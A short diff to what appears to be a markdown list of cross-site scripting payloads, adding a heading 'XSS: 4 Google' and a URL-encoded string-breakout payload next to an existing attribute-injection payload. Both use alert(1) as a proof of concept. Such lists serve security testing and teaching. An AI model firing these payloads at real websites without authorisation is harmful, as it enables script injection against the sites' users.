@@ -30,3 +30,9 @@
 ```js
 ' onfocus='alert(1)'  autofocus='
 ```
+
+# XSS: 4 Google
+
+```js
+')%3balert(1)%3bvar x=(''
+```
